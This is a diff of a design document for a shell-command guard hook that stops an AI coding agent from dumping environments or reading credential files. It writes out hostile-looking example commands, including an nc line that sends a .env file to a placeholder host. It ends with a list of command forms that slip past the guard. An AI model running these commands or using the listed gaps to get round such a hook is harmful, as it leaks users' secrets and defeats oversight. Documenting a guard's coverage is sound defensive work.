@@ -958,91 +958,133 @@ is replaced (`tools/adoption/install_claude_profile.py --only guard`, see
 
 ### Launchers, substitutions and manager environments (2026-09-29)
 
-A coverage review of the guard's own rules found four command forms it read too little of, each a way a stored value
-could be shown or forwarded by mistake. Each now gets the verdict of its plain equivalent; no rule was loosened, and
-`tests/test_secret_path_guard.py` keeps every earlier row.
+A coverage review of the guard's own rules on 2026-09-29 found command forms it read too little of, each a way a stored
+value could be shown or forwarded by mistake, and a repair round the same day fixed what a read-only review of that work
+found. Each form gets the verdict of its plain equivalent where stated below. No rule was loosened (a command the guard
+blocked before is blocked now), and `tests/test_secret_path_guard.py` keeps every earlier row except two that recorded
+the `systemd-run` gap and moved from `EXPECTED_PASS_THROUGH` to `BLOCKED`. The guard is a text reader of one line of
+shell, not a shell: what it does not read is listed at the end of this subsection.
 
-- **`systemd-run` is a modelled launcher.** Its own options are skipped as getopt reads them (systemd 255
-  `systemd-run(1)` and the option table of `src/run/run.c`, getopt string `+hrH:M:E:p:tPqGdSu:`; the value options
-  that v256 to v258 added are listed too), and the command it starts gets every rule, a nested `bash -ic '...'` string
-  included. With `--pipe` or `--wait` that command's output comes back to the caller, so
-  `systemd-run --user --pipe --wait cat "$PAPER_ENV_FILE"` is a `credential_file_read` and `... printenv` an
-  `environment_dump`. The trading lane's loader path (`systemd-run --user --unit=X --collect /bin/bash -ic 'exec python3
-  runner.py run --env-file "$PAPER_ENV_FILE_2"'`) still passes for both accounts. A secret variable name (any name in
-  the guard's list), with or without a value, set through `-E`/`--setenv` or `-p Environment=...` is a
-  `secret_variable_on_command_line`: the command line lands in the journal (`_CMDLINE`) and the unit's properties travel
-  over the user bus, and `-E NAME` without a value forwards the caller's own value (`systemd-run(1)` 255). Only the
-  variable's name is read (`-E LABEL=APCA_API_KEY_ID` sets `LABEL`). Not read: a long option abbreviated to a unique
-  prefix (getopt_long accepts `--uni demo`) and `-p PassEnvironment=NAME`.
+- **systemd's launchers are modelled: `systemd-run`, `run0`, `systemd-inhibit`, `systemd-cat`.** Each one's own options
+  are skipped as getopt reads them, redirections between them included (`systemd-run --user 2>/tmp/log --pipe printenv`),
+  and the command it starts gets every rule, a nested `bash -ic '...'` string too. The option tables come from upstream:
+  `src/run/run.c` at systemd v255 for `systemd-run` (getopt string `+hrH:M:E:p:tPqGdSu:`), with the value options of later
+  releases listed so a newer host's command is still found (`--capsule`/`-C` and `--background` from v256, `--json` from
+  v257, `--job-mode` from v258, `--root-directory` from v259 and `--output` from v261, each read in `run.c` at that tag);
+  `parse_argv_sudo_mode` in `run.c` at v256 to v262 for `run0`; `src/login/inhibit.c` and `src/journal/cat.c` for
+  `systemd-inhibit` and `systemd-cat`. What a launcher prints goes to the caller with `systemd-run --pipe` (`--wait`
+  shows terse unit information, and without either the output goes to the journal, `systemd-run(1)` 255), and
+  `systemd-cat` writes it to the journal, so `systemd-run --user --pipe --wait cat "$PAPER_ENV_FILE"` is a
+  `credential_file_read`, `... printenv` and `systemd-cat printenv` an `environment_dump`. The trading lane's loader path
+  (`systemd-run --user --unit=X --collect /bin/bash -ic 'exec python3 runner.py run --env-file "$PAPER_ENV_FILE_2"'`)
+  still passes for both accounts. A secret variable name (any name in the guard's list), with or without a value, set
+  through `systemd-run`'s `-E`/`--setenv` or `-p Environment=...` is a `secret_variable_on_command_line`. Measured on
+  this host (systemd 255.4): a transient unit's description defaults to its command line, so the manager writes the line
+  `Started <unit> - <command line>` once into the user journal (its MESSAGE field, not `_CMDLINE`), and the unit's
+  properties travel over the user bus; `-E NAME` without a value forwards the caller's own value (`systemd-run(1)` 255).
+  Only the variable's name is read (`-E LABEL=APCA_API_KEY_ID` sets `LABEL`).
 - **Command substitution inside double quotes is read.** The shell runs `$(...)` and a backquote pair inside a
   double-quoted word (Bash Reference Manual, "Command Substitution": `$` and the backquote keep their meaning inside
   double quotes), so `echo "$(printenv)"` dumps the environment, yet only the unquoted form was read. The body is now
-  read as a command, to 32 levels of nesting, so every rule applies to it: `echo "$(printenv)"`,
-  `x="$(printenv)"; echo "$x"` and `git commit -m "$(cat "$PAPER_ENV_FILE")"` are blocked as their unquoted forms are.
-  Single-quoted text and a backslash-escaped `\$(` or backquote stay data (`echo '$(printenv)'` and
-  `echo "\$(printenv)"` pass). Two things in that reading were repaired the same day. A here-document with a quoted
-  delimiter (`<<'EOF'`, `<<"EOF"`, `<<\EOF`) inside such a substitution holds data, so the body a scan returns loses it
-  and `git commit -m "$(cat <<'EOF' ... EOF)"` passes whatever its prose says: five real commit messages of this
-  repository that mention `set`, `ps -E`, a `cat` of a credential file or a keyring name in prose, and had made the
-  pattern fail, are ALLOWED rows in `tests/test_secret_path_guard.py`. A shell that reads such a body as code
-  (`echo "$(bash <<'EOF' ... EOF)"`) is therefore not read (it passed before too). An unquoted delimiter keeps its
-  body, which the shell expands and the guard reads as command lines, as it does for a top-level here-document, so
-  prose in it that looks like a command (a line that starts with `printenv`, or `(ps -E, ...)`) trips the guard; how
-  here-document bodies are read as commands is a separate, later change. And a `)` in a `#` comment inside the body
-  no longer ends it.
-- **A `#` comment hides only its own line, and only where a word starts (2026-09-29, repair round).** The tokenizer
-  joins the lines of a command with `;` and shlex reads a `#` anywhere, `$#` and `a#b` included, as the start of a
-  comment, so a `#` dropped the whole rest of the command: `# macOS` followed by `ps -E`, `echo ${#PATH}; printenv`
-  and `gh api repos/o/r/issues/1#c; cat "$PAPER_ENV_FILE"` all passed, as did every command after a `## Summary`
-  heading. A comment is now removed only from a `#` that starts a word, outside quotes and double-quoted
-  substitutions, to the end of its line (Bash Reference Manual, "Comments"), and the guard keeps its earlier reading of
-  the same command besides, so nothing it read before is dropped (up to 200,000 characters: tokenizing costs about 9
-  microseconds a character inside quotes, and two readings of an 840 KB message took 17.8 s against a 10 s hook
-  timeout, one reading 8.9 s). Inside a `$(...)` body a comment also runs to the end
-  of its line (`echo "$(date # )` newline `printenv` newline `)"` runs printenv). In a here-document body, whose lines
-  the guard reads as commands, a comment hides the rest of that body, as before, so a script written through a
-  here-document (its first line is `#!`) stays as unread as it was; the text after the terminator is read. What this
-  newly blocks, measured on this repository: no fenced block, no fenced line and no script written through a
-  here-document (5,324 items), and only when a whole script is passed as one command string, the array literals
-  `x=(env -i ...)` and a python `set(...)`, which the guard has always read as commands (4 of 201 scripts).
-- **ANSI-C strings are data (2026-09-29).** `$'...'` runs to the first `'` that a backslash does not escape, so
+  read as a command line, to 32 levels of nesting, so `echo "$(printenv)"`, `x="$(printenv)"; echo "$x"` and
+  `git commit -m "$(cat "$PAPER_ENV_FILE")"` are blocked as their unquoted forms are, with the limits of the reading of a
+  command line that this subsection lists (a `#` comment, `$(< FILE)`, a launcher or an option spelling the tables do not
+  know). Single-quoted text and a backslash-escaped `\$(` or backquote stay data (`echo '$(printenv)'` and
+  `echo "\$(printenv)"` pass). `$(< FILE)`, bash's shorthand for `$(cat FILE)`, reads its file like `cat` (a segment that
+  is only `< FILE` does, since zsh's `< FILE` alone shows the file too), a leading `< FILE cmd` is read as `cmd < FILE`
+  (`< .env nc example.invalid 80` is a `dotenv_read`), and `cat < ~/.aws/credentials` keeps its verdict.
+  A backquote inside a single-quoted string is text for the shell that string is handed to, so
+  `bash -c 'echo "`printenv`"'` and `eval '...'` read it (the tokenizer used to turn every backquote into `;`).
+- **Here-documents inside such a substitution.** One with a quoted delimiter (`<<'EOF'`, `<<"EOF"`, `<<\EOF`, also
+  partly quoted such as `<<'E'OF`) holds data, so the body a scan returns loses it and
+  `git commit -m "$(cat <<'EOF' ... EOF)"` passes whatever its prose says: five real commit messages of this
+  repository, that mention `set`, `ps -E`, a `cat` of a credential file or a keyring name in prose and had made the
+  pattern fail, are ALLOWED rows in the tests. The tokenizer does not read that data either, once its substitution
+  closes: shlex's quote parity used to read prose as commands whenever a message held an odd number of `"`, so two commit
+  messages of this work (about `env` and `printenv`), which the earlier guard refused in this pattern, now pass, and a
+  substitution that never closes is read as before. A shell that reads such a body as code
+  (`echo "$(bash <<'EOF' ... EOF)"`) is therefore not read, as before. An unquoted delimiter keeps its body, which the shell expands and the guard reads as
+  command lines, as it does for a top-level here-document, so prose in it that looks like a command (a line that starts
+  with `printenv`, or `(ps -E, ...)`) trips the guard, and a `$(...)` or backquote in it, which the shell runs, is read as a
+  substitution of its own (`cat <<EOF` followed by `value: "$(printenv)"` and `EOF` is an `environment_dump`, as is the
+  same body behind `"$(cat <<EOF ...)"`). How here-document bodies are read as commands stays as it was.
+- **A `#` comment hides only its own line, and only where a word starts.** The tokenizer joins the lines of a command
+  with `;` and shlex reads a `#` anywhere, `$#` and `a#b` included, as the start of a comment, so a `#` dropped the whole
+  rest of the command: `# macOS` followed by `ps -E`, `echo ${#PATH}; printenv` and
+  `gh api repos/o/r/issues/1#c; cat "$PAPER_ENV_FILE"` all passed, as did every command after a `## Summary` heading. A
+  comment is now removed only from a `#` that starts a word, outside quotes and double-quoted substitutions, to the end
+  of its line (Bash Reference Manual, "Comments"), and the guard keeps its earlier reading of the same command besides,
+  so nothing it read before is dropped (up to 200,000 characters: tokenizing costs about 9 microseconds a character inside
+  quotes, and two readings of an 840 KB message took 17.8 s against a 10 s hook timeout, one reading 8.9 s). Inside a
+  `$(...)` body a comment also runs to the end of its line (`echo "$(date # )` newline `printenv` newline `)"` runs
+  printenv). In a here-document body, whose lines the guard reads as commands, a comment hides the rest of that body, as
+  before, so a script written through a here-document (its first line is `#!`) stays as unread as it was; the text after
+  the terminator is read. What this newly blocks, measured on this repository: no fenced block, no fenced line and no
+  script written through a here-document, and only when a whole script is passed as one command string the array
+  literals `x=(env -i ...)` and a python `set(...)`, which the guard has always read as commands.
+- **ANSI-C strings are data.** `$'...'` runs to the first `'` that a backslash does not escape, so
   `printf '%s' $'it\'s "$("printenv")"'` holds no substitution and passes; inside double quotes `$'` is no such string.
+- **Arithmetic expansion is no command.** `$((` opens an arithmetic expansion only when a `))` that touches closes it:
+  `env=2; echo "$((env))"` reads the variable `env` and a `<<` in it is a shift, so both pass, while a real substitution
+  inside it (`$(( $(printenv | wc -l) + 1 ))`) is still read and `$((printenv) )`, whose parentheses do not touch, is a
+  substitution holding a subshell, as bash reads it.
 - **`ps -E` is an environment display.** macOS `ps` documents `-E` as "Display the environment as well" and lists the
   BSD-style `e` as "Same as -E" (Apple `adv_cmds` `ps.1`, read 2026-09-29). The guard blocked dashless clusters with a
   lower-case `e` (`ps eww`, `ps auxe`) but not these. It now blocks, as an `environment_dump`, `-E` alone or in a cluster
   before the first option that takes a value (`ps -Ewwp 123`, `ps -p 123 -E`, `ps -A -E`) and dashless clusters with a
   capital `E` (`ps Eww`, `ps auxE`). `ps -ef`, `ps -o pid,command -p N`, `ps aux` and an `E` that is only a value pass:
   the word after a stand-alone value option (`ps -u Eve`), after a cluster that ends in one (`ps -fu Eve`) or glued to
-  it (`ps -uEve`); a dashed `-e` is every process.
-- **`systemctl show-environment` is an environment dump.** It prints a service manager's whole environment block, "the
-  environment block that is passed to all processes the manager spawns" (`systemctl(1)` 255), so every variable the
-  session imported into that manager, a credential included, lands in the output. It is now blocked as a
-  `service_manager_environment`, with or without `--user`, behind any options (the option table of
+  it (`ps -uEve`); a dashed `-e` is every process. `-C` is a flag on macOS and takes a command name on procps, so a dashed
+  word with an `E` right after it (`ps -C -E`, `ps -CE`) is refused whichever host runs it, and `ps -CEmacs` with it.
+- **`systemctl show-environment` and a bare `systemctl show` are environment dumps.** `show-environment` prints a
+  service manager's whole environment block, "the environment block that is passed to all processes the manager spawns"
+  (`systemctl(1)` 255), and `show` with no unit prints the manager's own properties, `Environment=` among them, so
+  every variable the session imported into that manager, a credential included, lands in the output. Both are blocked as
+  a `service_manager_environment`, with or without `--user`, behind any options (the option table of
   `src/systemctl/systemctl.c` at v255 says which words are values: `-M host`, `-H user@host`, `-o json`), behind a
-  launcher and inside a substitution. `systemctl --user show -p Environment UNIT`, `cat`, `status` and `list-units`
-  still pass. Not read: `systemctl show` with no unit, which prints the manager's own properties, `Environment=`
-  among them.
-- **Arithmetic expansion is no command (2026-09-29, repair round).** `$((` opens an arithmetic expansion only when a
-  `))` that touches closes it: `env=2; echo "$((env))"` reads the variable `env` and a `<<` in it is a shift, so both
-  pass, while a real substitution inside it (`$(( $(printenv | wc -l) + 1 ))`) is still read and `$((printenv) )`, whose
-  parentheses do not touch, is a substitution holding a subshell, as bash reads it.
-- **An internal error blocks; a timeout does not (2026-09-29).** Only exit 2 blocks a PreToolUse call. `main()` now
-  catches any exception from the rules (`RecursionError` and `MemoryError` included) and blocks with one line,
+  launcher and inside a substitution; `show` passes when a unit is named or `-p` names other properties only. For one
+  unit use `systemctl --user show -p Environment UNIT`; for the `PATH` a unit sees run a command in one:
+  `systemd-run --user --pipe --wait --collect /bin/sh -c 'command -v node; echo "$PATH"'`. `systemctl --user cat`,
+  `status` and `list-units` pass. Inside a keyring exec, behind a launcher the guard does not model (`watch`, `flock`),
+  `systemctl` and the systemd launchers are read like the shells and `env` already are.
+- **Launchers named by their path are the same launchers** (`/usr/bin/sudo systemctl show-environment`,
+  `/usr/bin/timeout 5 printenv`): the wrapper walk compared the whole word.
+- **An internal error blocks; a timeout does not.** Only exit 2 blocks a PreToolUse call. `main()` now catches any
+  exception from the rules (`RecursionError` and `MemoryError` included) and blocks with one line,
   `blocked (guard_error)`, that names no command text and prints no traceback. A hook that runs past its timeout is
   cancelled and the call goes ahead (Claude Code hooks documentation, "Timeouts", read 2026-09-29: "A timed-out
-  command, http, or mcp_tool hook doesn't block the tool call"), and the guard's hook timeout is 10 s, so the time the
-  rules take is part of the guard's safety and no timer inside the hook can replace it. That is why each text is
+  `command`, `http`, or `mcp_tool` hook doesn't block the tool call"), and the guard's hook timeout is 10 s, so the time
+  the rules take is part of the guard's safety and no timer inside the hook can replace it. That is why each text is
   scanned in one pass (a stack of frames and a regular expression that jumps between the characters that matter, not
   a rescan per here-document, per arithmetic shift or per nesting level), a here-document's terminator is found by a
-  binary search in a line index built once, a chain of `env`, `rtk` or `systemd-run` launchers is walked by index
-  instead of copying the rest of the command at every hop, and the bodies read behind double-quoted substitutions are
-  capped at 32 levels and at four times the command's length plus 64 KiB. Measured on this host with the nine inputs of
+  binary search in a line index built once, a chain of `env`, `rtk` or `systemd-run` launchers is walked by index instead
+  of copying the rest of the command at every hop, and the bodies read behind double-quoted substitutions are capped at
+  32 levels and at four times the command's length plus 64 KiB. Measured on this host with the nine inputs of
   `PATHOLOGICAL` in `tests/test_secret_path_guard.py`: the first version of the substitution scan took 10 s on 12,000
   here-documents and on 12,000 lines of `$((1 << 2))`, and ran past a minute on 60,000 nested `systemd-run`; the launcher
   walk that predates this work took 29 s on 20,000 nested `env` and 56 s on 20,000 nested `rtk proxy`. Each input now
   takes under a second (the test bounds it at 3 s). Not fixed: tokenizing is shlex's, about 9 microseconds a character
   inside quotes, so a single command of about a megabyte of quoted text still takes most of the 10 s (the same before
   this work), and a substitution nested beyond the caps above is not read.
+- **Alternatives considered for reading shell syntax (2026-09-29).** A full shell parser was not adopted: the hook is one
+  standard-library file that the profile installer copies verbatim to the host, and each candidate would have to be
+  vendored per platform and started per call. `bashlex` 0.18 (PyPI 2023-01-18, GitHub last pushed 2024-04-08, GPL-3.0)
+  is stale, `tree-sitter-bash` (pushed 2026-09-13, MIT) needs compiled bindings, and `mvdan/sh` (pushed 2026-09-28,
+  BSD-3-Clause) is a Go binary. The hand-written reading is checked by a differential against the previous guard on
+  generated commands and on this repository's own fences and scripts instead, and it stays a text heuristic.
+
+What the guard does not read, each an inert string that `tests/test_secret_path_guard.py` records in
+`EXPECTED_PASS_THROUGH` where it passes: a case pattern's `)` closes a `$(` (`echo "$(case x in x) printenv;; esac)"`),
+bash 5.3's `${ command; }`, a backquote escaped inside a double-quoted wrapper string
+(`bash -c "echo \"\`printenv\`\""`), a long option abbreviated to a unique prefix, which getopt_long accepts
+(`systemd-run --mach host --pipe cat .env`, `--uni demo`), `systemd-run -p PassEnvironment=NAME` and words after the
+started command, `run0 --setenv=NAME` (no secret name is read on a `run0` line), `machinectl shell .host /usr/bin/printenv`
+and `busctl --user get-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager
+Environment`, and a substitution nested beyond 32 levels or past the work budget (shlex's quote parity happens to expose
+the innermost command of `"$(echo "$(...)")"` one level down, so the tests count the texts read instead). The other
+way, the guard reads as commands what is not one: an array literal `x=(env -i A=b)`, a python `set(...)` in a script
+body and prose in a here-document that looks like a command (the old reading of here-documents, unchanged), and an `E`
+after `ps -C` that is a command name (`ps -CEmacs`).
 
 ## Threat model and what each guard stops
 
